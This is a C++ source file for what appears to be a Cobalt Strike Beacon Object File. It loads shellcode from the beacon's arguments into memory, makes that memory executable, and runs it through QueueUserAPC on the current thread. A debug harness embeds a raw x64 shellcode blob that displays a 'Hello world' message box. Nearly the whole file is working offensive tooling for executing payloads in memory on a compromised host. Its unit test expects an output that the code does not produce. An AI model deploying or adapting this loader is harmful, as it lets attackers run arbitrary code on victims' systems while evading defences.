#include <Windows.h>
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

extern "C" {
#include "beacon.h"
#include "sleepmask.h"

DFR(KERNEL32, GetLastError);
#define GetLastError KERNEL32$GetLastError
DFR(KERNEL32, FormatMessageA);
#define FormatMessageA KERNEL32$FormatMessageA
DFR(KERNEL32, VirtualProtect);
#define VirtualProtect KERNEL32$VirtualProtect
DFR(KERNEL32, VirtualAlloc);
#define VirtualAlloc KERNEL32$VirtualAlloc
DFR(KERNEL32, VirtualFree);
#define VirtualFree KERNEL32$VirtualFree
DFR(KERNEL32, QueueUserAPC);
#define QueueUserAPC KERNEL32$QueueUserAPC
DFR(KERNEL32, GetCurrentThread);
#define GetCurrentThread KERNEL32$GetCurrentThread
DFR(KERNEL32, WaitForSingleObjectEx);
#define WaitForSingleObjectEx KERNEL32$WaitForSingleObjectEx
DFR(KERNEL32, CloseHandle);
#define CloseHandle KERNEL32$CloseHandle
DFR(MSVCRT, memcpy);
#define memcpy MSVCRT$memcpy

void go(char* args, int len) {
    datap argParse;
    HANDLE hThread = GetCurrentThread();

    BeaconDataParse(&argParse, args, len);
    int iShellcodeSize = BeaconDataLength(&argParse);
    char* pShellcode = BeaconDataExtract(&argParse, &iShellcodeSize);

    LPVOID lpBuffer = VirtualAlloc(NULL, iShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!lpBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory region for shellcode: %d", GetLastError());
        return;
    }

    memcpy(lpBuffer, pShellcode, iShellcodeSize);

    DWORD dwOldProtect = 0;
    if (VirtualProtect(lpBuffer, iShellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect) == 0) {
        DWORD error = GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "Failed to change protection for memory region: %d", error);
        return;
    }

    if (QueueUserAPC((PAPCFUNC)lpBuffer, hThread, NULL) == 0) {
        DWORD error = GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "Failed to schedule APC: %d", error);
        return;
    }

    WaitForSingleObjectEx(hThread, INFINITE, TRUE);
    VirtualFree(lpBuffer, iShellcodeSize, MEM_RELEASE);
}
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42,
    // "foobar");
    bof::mock::BofData data;

    char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
                       "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
                       "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
                       "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
                       "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
                       "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
                       "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
                       "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
                       "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
                       "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
                       "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
                       "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
                       "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
                       "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
                       "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
                       "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
                       "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
                       "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
                       "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
                       "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
                       "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
                       "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
                       "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
                       "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
                       "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
                       "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
                       "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
                       "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
                       "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

    data.addData(shellcode, 434);

    // bof::runMocked<>(go(data.get(), data.size());
    go(data.get(), data.size());

    /* To test a sleepmask BOF, the following mockup executors can be used
    // Mock up Beacon and run the sleep mask once
    bof::runMockedSleepMask(sleep_mask);

    // Mock up Beacon with the specific .stage C2 profile
    bof::runMockedSleepMask(sleep_mask,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::True,
            .module = "",
        },
        {
            .sleepTimeMs = 5000,
            .runForever = false,
        }
    );
    */

    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got = bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {{CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}};
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif
